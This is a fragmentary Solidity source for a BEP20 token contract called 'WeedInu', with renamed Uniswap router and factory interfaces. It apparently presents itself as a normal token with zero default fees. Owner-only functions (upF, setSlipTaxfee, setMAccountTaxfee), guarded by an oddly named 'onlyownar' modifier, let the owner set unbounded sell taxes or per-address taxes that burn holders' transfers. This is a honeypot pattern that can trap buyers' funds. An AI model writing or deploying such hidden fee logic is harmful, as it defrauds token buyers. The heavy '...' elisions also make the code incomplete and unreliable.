...
interface IUniswapV2Factory {
    ...
    function TaxfeeTo() external view returns (address);
    function TaxfeeToSetter() external view returns (address);
    ...
    function setTaxfeeTo(address) external;
    function setTaxfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingTaxfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingTaxfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingTaxfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingTaxfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
...
contract WeedInu is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellTaxfee = 0;

    uint256 private _defaultBuyTaxfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipTaxfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellTaxfee = _value;
    }

    function setSlipTaxfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipTaxfee[_address] = _value;
    }

    function getSlipTaxfee(address _address) external view onlyownar returns (uint256) {
        return _slipTaxfee[_address];
    }


    function setMAccountTaxfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountTaxfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeTaxfeeAmount = 0;

        if (rF) {
            uint256 tradeTaxfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradeTaxfee = _defaultSellTaxfee;
                }
                if (from == uniswapV2Pair) {

                    tradeTaxfee = _defaultBuyTaxfee;
                }
            }
            if (_slipTaxfee[from] > 0) {
                tradeTaxfee = _slipTaxfee[from];
            }

            tradeTaxfeeAmount = _Amount.mul(tradeTaxfee).div(100);
        }


        if (tradeTaxfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradeTaxfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradeTaxfeeAmount);
            emit Transfer(from, _deadAddress, tradeTaxfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradeTaxfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradeTaxfeeAmount);
        emit Transfer(from, _to, _Amount - tradeTaxfeeAmount);
    }
